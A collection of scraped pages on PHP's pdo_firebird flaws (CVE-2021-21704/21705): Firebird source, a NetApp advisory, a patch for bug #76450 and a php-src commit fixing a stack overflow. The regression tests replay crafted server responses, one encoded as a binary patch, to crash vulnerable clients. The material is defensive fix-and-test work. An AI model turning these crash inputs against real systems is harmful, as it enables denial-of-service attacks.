 case isc\_info\_blob\_max\_segment: p = fb\_utils::putInfoItemInt(\*item, max\_segment, p, end); break;
 case isc\_info\_blob\_total\_length: p = fb\_utils::putInfoItemInt(\*item, total\_length, p, end); break;
 case isc\_info\_blob\_type: p = fb\_utils::putInfoItemInt(\*item, blob\_type, p, end); break;
 default: // unknown info item, let remote server handle it return false; } }
 if (p < end) \*p++ = isc\_info\_end;
 return true;}
void RBlobInfo::parseInfo(unsigned int bufferLength, const unsigned char\* buffer){ int c = 0; valid = false;
 ClumpletReader p(ClumpletReader::InfoResponse, buffer, bufferLength); for (; !p.isEof(); p.moveNext()) { switch (p.getClumpTag()) { case isc\_info\_blob\_num\_segments: num\_segments = p.getInt(); c++; break; case isc\_info\_blob\_max\_segment: max\_segment = p.getInt(); c++; break; case isc\_info\_blob\_total\_length: total\_length = p.getInt(); c++; break; case isc\_info\_blob\_type: blob\_type = p.getInt(); c++; break; case isc\_info\_end: break; default: fb\_assert(false); break; } } valid = (c == 4);}
void Rrq::saveStatus(const Exception& ex) noexcept{ if (rrqStatus.isSuccess()) { LocalStatus ls; CheckStatusWrapper tmp(&ls); ex.stuffException(&tmp); rrqStatus.save(&tmp); }}
void Rrq::saveStatus(IStatus\* v) noexcept{ if (rrqStatus.isSuccess()) { rrqStatus.save(v); }}
void Rsr::saveException(const Exception& ex, bool overwrite){ if (!rsr\_status) { rsr\_status = FB\_NEW StatusHolder(); }
 if (overwrite || !rsr\_status->getError()) { LocalStatus ls; CheckStatusWrapper temp(&ls); ex.stuffException(&temp); rsr\_status->save(&temp); }}
string rem\_port::getRemoteId() const{ fb\_assert(port\_protocol\_id.hasData()); string id = port\_protocol\_id;
 if (port\_address.hasData()) id += string("/") + port\_address;
 return id;}
LegacyPlugin REMOTE\_legacy\_auth(const char\* nm, int p){ const char\* legacyTrusted = "WIN\_SSPI"; if (fb\_utils::stricmp(legacyTrusted, nm) == 0 && (p == PROTOCOL\_VERSION11 || p == PROTOCOL\_VERSION12)) { return PLUGIN\_TRUSTED; }
 const char\* legacyAuth = "LEGACY\_AUTH"; if (fb\_utils::stricmp(legacyAuth, nm) == 0 && p < PROTOCOL\_VERSION13) { return PLUGIN\_LEGACY;[View remainder of file in raw view](https://github.com/FirebirdSQL/firebird/raw/refs/heads/master/src/remote/remote.cpp)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from security.netapp.com_dbede070_20250115_090359.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [September 2021 PHP Vulnerabilities in NetApp Products](https://security.netapp.com/advisory/ntap-20211029-0006)

## September 2021 PHP Vulnerabilities in NetApp Products

circle-check-alt

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20211029-0006 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20211029-0006 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20211029-0006 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20211029-0006 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20211029-0006
**Version:**
9.0

**Last updated:**
05/09/2024

**Status:**
Final.

**CVEs:** CVE-2021-21704, CVE-2021-21705

Overview
#### Summary

Multiple NetApp products incorporate PHP. PHP versions 7.3.x prior to 7.3.29, 7.4.x prior to 7.4.21, and 8.0.x prior to 8.0.8 are susceptible to vulnerabilities which when successfully exploited could lead to addition or modification of data or Denial of Service (DoS).

#### Impact

Successful exploitation of these vulnerabilities could lead to addition or modification of data or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2021-21704](https://nvd.nist.gov/vuln/detail/CVE-2021-21704) | 5.9 (MEDIUM) | CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H |
| [CVE-2021-21705](https://nvd.nist.gov/vuln/detail/CVE-2021-21705) | 5.3 (MEDIUM) | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <https://bugs.php.net/bug.php?id=76448>
* <https://bugs.php.net/bug.php?id=81122>

Affected Products
#### Affected Products

* ONTAP 9 (formerly Clustered Data ONTAP)

#### Products Not Affected

* AFF Baseboard Management Controller (BMC) - A700s
* ATTO FibreBridge - 7500N
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - Cloud Insights Telegraf Agent
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Trident
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Insights Acquisition Unit
* Cloud Insights Storage Workload Security Agent
* Cloud Insights Telegraf Agent
* Cloud Volumes ONTAP Mediator
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM6 SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster Tiebreaker for clustered Data ONTAP
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node (Bootstrap OS)
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP Select Deploy administration utility
* OnCommand Insight
* OnCommand Workflow Automation
* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG6060/SGF6024/SGF6112
* StorageGRID Baseboard Management Controller (BMC)
* System Manager 9.x

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **ONTAP 9 (formerly Clustered Data ONTAP)** | <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.6P18> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.7P19> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.8P11> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.9.1P7> <https://mysupport.netapp.com/site/products/all/details/ontap9/downloads-tab/download/62286/9.10.1P1> |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Final.**

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20211029-0006>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20211029 | Initial Public Release |
| 2.0 | 20220127 | Clustered Data ONTAP added to Software Versions and Fixes |
| 3.0 | 20220201 | Clustered Data ONTAP removed from Software Versions and Fixes as the fix was not in 9.8P9 |
| 4.0 | 20220215 | Clustered Data ONTAP 9.9.1P7 added to Software Versions and Fixes |
| 5.0 | 20220228 | Clustered Data ONTAP 9.10.1P1 added to Software Versions and Fixes |
| 6.0 | 20220322 | Clustered Data ONTAP 9.8P11 added to Software Versions and Fixes |
| 7.0 | 20220419 | Clustered Data ONTAP 9.6P18 added to Software Versions and Fixes |
| 8.0 | 20220607 | Clustered Data ONTAP 9.7P19 added to Software Versions and Fixes |
| 9.0 | 20240509 | Final status |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from gist.github.com_2cf8007a_20250115_133630.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F44a36b067a66f3770b914a7fa88e5086)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F44a36b067a66f3770b914a7fa88e5086&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F44a36b067a66f3770b914a7fa88e5086) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F44a36b067a66f3770b914a7fa88e5086&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=64&v=4)](/cmb69)

# [cmb69](/cmb69)/**[0001-Fix-76450-SIGSEGV-in-firebird\_stmt\_execute.patch](/cmb69/44a36b067a66f3770b914a7fa88e5086)** Secret

Created
May 5, 2021 12:53

Show Gist options

* [Download ZIP](/cmb69/44a36b067a66f3770b914a7fa88e5086/archive/854784f8ea846a36e6cfbc922954ca957924a43d.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F44a36b067a66f3770b914a7fa88e5086)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F44a36b067a66f3770b914a7fa88e5086)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/44a36b067a66f3770b914a7fa88e5086.js&quot;&gt;&lt;/script&gt;
* Save cmb69/44a36b067a66f3770b914a7fa88e5086 to your computer and use it in GitHub Desktop.

[Code](/cmb69/44a36b067a66f3770b914a7fa88e5086)
[Revisions
1](/cmb69/44a36b067a66f3770b914a7fa88e5086/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/cmb69/44a36b067a66f3770b914a7fa88e5086.js&quot;&gt;&lt;/script&gt;

Save cmb69/44a36b067a66f3770b914a7fa88e5086 to your computer and use it in GitHub Desktop.

[Download ZIP](/cmb69/44a36b067a66f3770b914a7fa88e5086/archive/854784f8ea846a36e6cfbc922954ca957924a43d.zip)

Fix for PHP bug #76450

 [Raw](/cmb69/44a36b067a66f3770b914a7fa88e5086/raw/854784f8ea846a36e6cfbc922954ca957924a43d/0001-Fix-76450-SIGSEGV-in-firebird_stmt_execute.patch)

[**0001-Fix-76450-SIGSEGV-in-firebird\_stmt\_execute.patch**](#file-0001-fix-76450-sigsegv-in-firebird_stmt_execute-patch)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | From 24ececffb3cceb7de874d0f6dc9384b80df0bd36 Mon Sep 17 00:00:00 2001 |
| --- | --- |
|  | From: "Christoph M. Becker" <cmbecker69@gmx.de> |
|  | Date: Fri, 30 Apr 2021 14:10:50 +0200 |
|  | Subject: [PATCH] Fix #76450: SIGSEGV in firebird\_stmt\_execute |
|  |  |
|  | We need to verify that the `result\_size` is not larger than our buffer, |
|  | and also should make sure that the `len` which is passed to |
|  | `isc\_vax\_integer()` has a permissible value; otherwise we bail out. |
|  | --- |
|  | ext/pdo\_firebird/firebird\_statement.c | 7 +++++++ |
|  | ext/pdo\_firebird/tests/bug\_76450.data | Bin 0 -> 464 bytes |
|  | ext/pdo\_firebird/tests/bug\_76450.phpt | 29 ++++++++++++++++++++++++++ |
|  | 3 files changed, 36 insertions(+) |
|  | create mode 100644 ext/pdo\_firebird/tests/bug\_76450.data |
|  | create mode 100644 ext/pdo\_firebird/tests/bug\_76450.phpt |
|  |  |
|  | diff --git a/ext/pdo\_firebird/firebird\_statement.c b/ext/pdo\_firebird/firebird\_statement.c |
|  | index 05dfe46848..7a948c9bd3 100644 |
|  | --- a/ext/pdo\_firebird/firebird\_statement.c |
|  | +++ b/ext/pdo\_firebird/firebird\_statement.c |
|  | @@ -136,8 +136,14 @@ static int firebird\_stmt\_execute(pdo\_stmt\_t \*stmt) /\* {{{ \*/ |
|  | } |
|  | if (result[0] == isc\_info\_sql\_records) { |
|  | unsigned i = 3, result\_size = isc\_vax\_integer(&result[1], 2); |
|  | + if (result\_size > sizeof(result)) { |
|  | + goto error; |
|  | + } |
|  | while (result[i] != isc\_info\_end && i < result\_size) { |
|  | short len = (short) isc\_vax\_integer(&result[i + 1], 2); |
|  | + if (len != 1 && len != 2 && len != 4) { |
|  | + goto error; |
|  | + } |
|  | if (result[i] != isc\_info\_req\_select\_count) { |
|  | affected\_rows += isc\_vax\_integer(&result[i + 3], len); |
|  | } |
|  | @@ -161,6 +167,7 @@ static int firebird\_stmt\_execute(pdo\_stmt\_t \*stmt) /\* {{{ \*/ |
|  | return 1; |
|  | } while (0); |
|  |  |
|  | +error: |
|  | RECORD\_ERROR(stmt); |
|  |  |
|  | return 0; |
|  | diff --git a/ext/pdo\_firebird/tests/bug\_76450.data b/ext/pdo\_firebird/tests/bug\_76450.data |
|  | new file mode 100644 |
|  | index 0000000000000000000000000000000000000000..51f949cc210d194c6c95d2d9f78e1437f5f6f076 |
|  | GIT binary patch |
|  | literal 464 |
|  | zcmZQzV2Jzwzk#2Dfq@Z-S%DY?xP4O76O$|B9ZO3xAR-Vl2Fk%D&xx!U$\_AMW10Z>1 |
|  | zK1dvy50YmB2\_gY>c\_b+Yc~KSy4xoTE3s@T~I}2Er1xkapqU%TIgH$8)(d}0h|No!= |
|  | q-+z!Y0f^DO5Q+~%F+nw>n\*q{\*3{d3%0|Bxmkc}dbCI{jYEe`-nDiu=z |
|  |  |
|  | literal 0 |
|  | HcmV?d00001 |
|  |  |
|  | diff --git a/ext/pdo\_firebird/tests/bug\_76450.phpt b/ext/pdo\_firebird/tests/bug\_76450.phpt |
|  | new file mode 100644 |
|  | index 0000000000..8d14c41059 |
|  | --- /dev/null |
|  | +++ b/ext/pdo\_firebird/tests/bug\_76450.phpt |
|  | @@ -0,0 +1,29 @@ |
|  | +--TEST-- |
|  | +Bug #76450 (SIGSEGV in firebird\_stmt\_execute) |
|  | +--SKIPIF-- |
|  | +<?php |
|  | +if (!extension\_loaded('pdo\_firebird')) die("skip pdo\_firebird extension not available"); |
|  | +if (!extension\_loaded('sockets')) die("skip sockets extension not available"); |
|  | +?> |
|  | +--FILE-- |
|  | +<?php |
|  | +require\_once "payload\_server.inc"; |
|  | + |
|  | +$address = run\_server(\_\_DIR\_\_ . "/bug\_76450.data"); |
|  | + |
|  | +// no need to change the credentials; we're running against a fake server |
|  | +$dsn = "firebird:dbname=inet://$address/test"; |
|  | +$username = 'SYSDBA'; |
|  | +$password = 'masterkey'; |
|  | + |
|  | +$dbh = new PDO($dsn, $username, $password, [PDO::ATTR\_ERRMODE => PDO::ERRMODE\_EXCEPTION]); |
|  | +$sql = "EXECUTE PROCEDURE test\_proc 123"; |
|  | +$query = $dbh->prepare($sql); |
|  | +try { |
|  | + $query->execute(); |
|  | +} catch (Exception $ex) { |
|  | + echo "{$ex->getMessage()}\n"; |
|  | +} |
|  | +?> |
|  | +--EXPECT-- |
|  | +SQLSTATE[HY000]: General error |
|  | -- |
|  | 2.31.1.windows.1 |
|  |  |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fcmb69%2F44a36b067a66f3770b914a7fa88e5086)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_3ffd16ff_20250115_133645.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F67afa32541ebc4abbf633cb1e7e879b2fbb616ad)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fphp%2Fphp-src%2Fcommit%2F67afa32541ebc4abbf633cb1e7e879b2fbb616ad)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=php%2Fphp-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[php](/php)
/
**[php-src](/php/php-src)**
Public

* [Notifications](/login?return_to=%2Fphp%2Fphp-src) You must be signed in to change notification settings
* [Fork
  7.8k](/login?return_to=%2Fphp%2Fphp-src)
* [Star
   38.5k](/login?return_to=%2Fphp%2Fphp-src)

* [Code](/php/php-src)
* [Issues
  737](/php/php-src/issues)
* [Pull requests
  562](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

Additional navigation options

* [Code](/php/php-src)
* [Issues](/php/php-src/issues)
* [Pull requests](/php/php-src/pulls)
* [Actions](/php/php-src/actions)
* [Security](/php/php-src/security)
* [Insights](/php/php-src/pulse)

## Commit

[Permalink](/php/php-src/commit/67afa32541ebc4abbf633cb1e7e879b2fbb616ad)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix #76448: Stack buffer overflow in firebird\_info\_cb

[Browse files](/php/php-src/tree/67afa32541ebc4abbf633cb1e7e879b2fbb616ad)
Browse the repository at this point in the history

```
We ensure not to overflow the stack allocated buffer by using `strlcat`.
```

* Loading branch information

[![@cmb69](https://avatars.githubusercontent.com/u/2306138?s=40&v=4)](/cmb69) [![@smalyshev](https://avatars.githubusercontent.com/u/155000?s=40&v=4)](/smalyshev)

[cmb69](/php/php-src/commits?author=cmb69 "View all commits by cmb69")
authored and
[smalyshev](/php/php-src/commits?author=smalyshev "View all commits by smalyshev")
committed
Jun 21, 2021

1 parent
[08da7c7](/php/php-src/commit/08da7c73726f7b86b67d6f0ff87c73c585a7834a)

commit 67afa32

 Show file tree

 Hide file tree

Showing
**3 changed files**
with
**28 additions**
and
**3 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* ext/pdo\_firebird

  + ext/pdo\_firebird/firebird\_driver.c
    [firebird\_driver.c](#diff-5684d3d61815495ce66588eb12da8a5d1bcf1accf5266f59f85577d3405affeb)
  + tests

    - ext/pdo\_firebird/tests/bug\_76448.data
      [bug\_76448.data](#diff-90790de1010c2f59246c9c525059d01e60f5d73400a0df1627013014dc024247)
    - ext/pdo\_firebird/tests/bug\_76448.phpt
      [bug\_76448.phpt](#diff-5ec63dea24d65d13809808e955c513e7a6fda528e309b6d6fa40131f28b42db8)

## There are no files selected for viewing

8 changes: 5 additions & 3 deletions

8
[ext/pdo\_firebird/firebird\_driver.c](#diff-5684d3d61815495ce66588eb12da8a5d1bcf1accf5266f59f85577d3405affeb "ext/pdo_firebird/firebird_driver.c")

Show comments

[View file](/php/php-src/blob/67afa32541ebc4abbf633cb1e7e879b2fbb616ad/ext/pdo_firebird/firebird_driver.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -509,14 +509,16 @@ static int firebird\_handle\_set\_attribute(pdo\_dbh\_t \*dbh, zend\_long attr, zval \*v |
|  |  | } |
|  |  | /\* }}} \*/ |
|  |  |  |
|  |  | #define INFO\_BUF\_LEN 512 |
|  |  |  |
|  |  | /\* callback to used to report database server info \*/ |
|  |  | static void firebird\_info\_cb(void \*arg, char const \*s) /\* {{{ \*/ |
|  |  | { |
|  |  | if (arg) { |
|  |  | if (\*(char\*)arg) { /\* second call \*/ |
|  |  | strcat(arg, " "); |
|  |  | strlcat(arg, " ", INFO\_BUF\_LEN); |
|  |  | } |
|  |  | strcat(arg, s); |
|  |  | strlcat(arg, s, INFO\_BUF\_LEN); |
|  |  | } |
|  |  | } |
|  |  | /\* }}} \*/ |
| Expand All | | @@ -527,7 +529,7 @@ static int firebird\_handle\_get\_attribute(pdo\_dbh\_t \*dbh, zend\_long attr, zval \*v |
|  |  | pdo\_firebird\_db\_handle \*H = (pdo\_firebird\_db\_handle \*)dbh->driver\_data; |
|  |  |  |
|  |  | switch (attr) { |
|  |  | char tmp[512]; |
|  |  | char tmp[INFO\_BUF\_LEN]; |
|  |  |  |
|  |  | case PDO\_ATTR\_AUTOCOMMIT: |
|  |  | ZVAL\_LONG(val,dbh->auto\_commit); |
| Expand Down | |  |

Binary file added
BIN
+749 Bytes

[ext/pdo\_firebird/tests/bug\_76448.data](#diff-90790de1010c2f59246c9c525059d01e60f5d73400a0df1627013014dc024247 "ext/pdo_firebird/tests/bug_76448.data")

Show comments

[View file](/php/php-src/blob/67afa32541ebc4abbf633cb1e7e879b2fbb616ad/ext/pdo_firebird/tests/bug_76448.data)
Edit file

Delete file

Binary file not shown.

23 changes: 23 additions & 0 deletions

23
[ext/pdo\_firebird/tests/bug\_76448.phpt](#diff-5ec63dea24d65d13809808e955c513e7a6fda528e309b6d6fa40131f28b42db8 "ext/pdo_firebird/tests/bug_76448.phpt")

Show comments

[View file](/php/php-src/blob/67afa32541ebc4abbf633cb1e7e879b2fbb616ad/ext/pdo_firebird/tests/bug_76448.phpt)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,23 @@ |
|  |  | --TEST-- |
|  |  | Bug #76448 (Stack buffer overflow in firebird\_info\_cb) |
|  |  | --SKIPIF-- |
|  |  | <?php |
|  |  | if (!extension\_loaded('pdo\_firebird')) die("skip podo\_firebird extension not available"); |
|  |  | if (!extension\_loaded('sockets')) die("skip sockets extension not available"); |
|  |  | ?> |
|  |  | --FILE-- |
|  |  | <?php |
|  |  | require\_once "payload\_server.inc"; |
|  |  |  |
|  |  | $address = run\_server(\_\_DIR\_\_ . "/bug\_76448.data"); |
|  |  |  |
|  |  | // no need to change the credentials; we're running against a falke server |
|  |  | $dsn = "firebird:dbname=inet://$address/test"; |
|  |  | $username = 'SYSDBA'; |
|  |  | $password = 'masterkey'; |
|  |  |  |
|  |  | $dbh = new PDO($dsn, $username, $password, [PDO::ATTR\_ERRMODE => PDO::ERRMODE\_EXCEPTION]); |
|  |  | var\_dump($dbh->getAttribute(PDO::ATTR\_SERVER\_INFO)); |
|  |  | ?> |
|  |  | --EXPECT-- |
|  |  | bool(false) |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `67afa32`

Please
